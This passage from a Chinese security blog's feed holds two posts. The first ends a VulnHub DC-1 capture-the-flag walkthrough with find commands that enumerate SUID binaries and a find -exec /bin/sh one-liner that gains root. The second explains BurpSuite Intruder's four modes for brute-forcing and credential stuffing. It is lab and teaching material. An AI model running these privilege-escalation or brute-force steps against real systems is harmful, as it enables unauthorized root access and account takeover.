<p>增加了一个用户user，密码为123456，尝试登陆网站，发现登陆成功</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524233018.png" alt=""></p>
<h3 id="发现flag3-2">发现flag3</h3>
<p>从网站上找到了flag3的界面，得到提示<code>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</code>，重点在（FIND the passwd、need to -exec that command、in the shadow）</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524223823.png" alt=""></p>
<p>根据线索，我们又找到了flag4以及它的目录，再根据flag4的提示，（用相同的方法在root目录下）找到最终flag</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524224339.png" alt=""></p>
<h2 id="0×06-提权">0×06 提权</h2>
<p>于是，想到suid提权，查询具有root权限的命令，以下均可查询：</p>
<ul>
<li>find / -user root -perm -4000 -print 2&gt;/dev/null</li>
<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
<li>find / -user root -perm -4000 -exec ls -ldb { }<br>
注： -type f即文件，-perm -u=s 即user权限位为suid</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230257.png" alt=""></p>
<p>发现<code>find</code>命令本身就是root权限</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230453.png" alt=""></p>
<p>于是就用<code>find</code>提权，<code>find ./ aaa -exec '/bin/sh' \\;</code> ，或者新建一个文件，验证一下，已经是root了</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230955.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231608.png" alt=""></p>
<h3 id="最终flag">最终flag</h3>
<p>接着找到根目录下的root目录，里面就是最终的flag</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231307.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231720.png" alt=""></p>
<h2 id="0×07-总结">0×07 总结</h2>
<p>DC-1找到最终的flag并不难，难在找齐五个flag，第一次实验，很生疏，存在很多问题：</p>
<ul>
<li>
<p>metasploit 熟练度不足，且exploit模块成功后的shell不是交互性，DC-1安装了python环境，可以通过pty.spawn()获得交互性shell</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524235827.png" alt=""></p>
</li>
<li>
<p>exploitdb熟练度也不足</p>
</li>
<li>
<p>Linux熟练度不足，find命令，有待学习</p>
</li>
<li>
<p>suid提权的命令（nmap、vim、find、bash、more、less、nano、cp），有待学习</p>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>VulnHub</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite——Intruder四种模式详解</title>
    <url>/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="一、Sniper（狙击手）">一、Sniper（狙击手）</h2>
<p>Sniper模式只能使用一组 payload 集合，一次只使用一个 payload 位置；假如标记了两个位置 “A” 和 “B” ，payload 集合内有“1”和“2”两个值，那么它攻击会形成以下组合：</p>
<table>
<thead>
<tr>
<th style="text-align:center">攻击序列</th>
<th style="text-align:center">位置A</th>
<th style="text-align:center">位置B</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">不替换</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">不替换</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">不替换</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">不替换</td>
<td style="text-align:center">2</td>
</tr>
</tbody>
</table>
<p>适用场景：竞争条件测试（选择Null payloads），密码、验证码暴力破解，重放攻击等场景</p>
<h2 id="二、Battering-ram（攻城锤）">二、Battering ram（攻城锤）</h2>
<p>同样只能使用一组 payload 集合，不同的地方在于每次攻击都是替换所有payload标记位置；如果添加了两个参数的话，就一起进行爆破，两个参数爆破时候的值肯定就是一样的了：</p>
<table>
<thead>
<tr>
<th style="text-align:center">攻击序列</th>
<th style="text-align:center">位置A</th>
<th style="text-align:center">位置B</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
</tr>
</tbody>
</table>
<p>适用场景：暴力破解</p>
<h2 id="三、Pitchfork（草叉）">三、Pitchfork（草叉）</h2>
<p>草叉模式允许使用多组payload组合，如果只添加了一个参数的话，会报错；在每个标记位置上遍历各自对应的payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，那么它攻击会形成以下组合：</p>
<table>
<thead>
<tr>
<th style="text-align:center">攻击序列</th>
<th style="text-align:center">位置A</th>
<th style="text-align:center">位置B</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">4</td>
</tr>
</tbody>
</table>
<p>注：如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。</p>
<p>适用场景：恶意注册、撞裤</p>
<h2 id="四、Cluster-bomb（集束炸弹）">四、Cluster bomb（集束炸弹）</h2>
<p>集束炸弹也允许使用多组payload组合，跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，那么它攻击会形成以下组合：</p>
<table>
<thead>
<tr>
<th style="text-align:center">攻击序列</th>
<th style="text-align:center">位置A</th>
<th style="text-align:center">位置B</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">4</td>
</tr>
</tbody>
</table>
<p>适用场景：账号、密码暴力破解</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
</search>
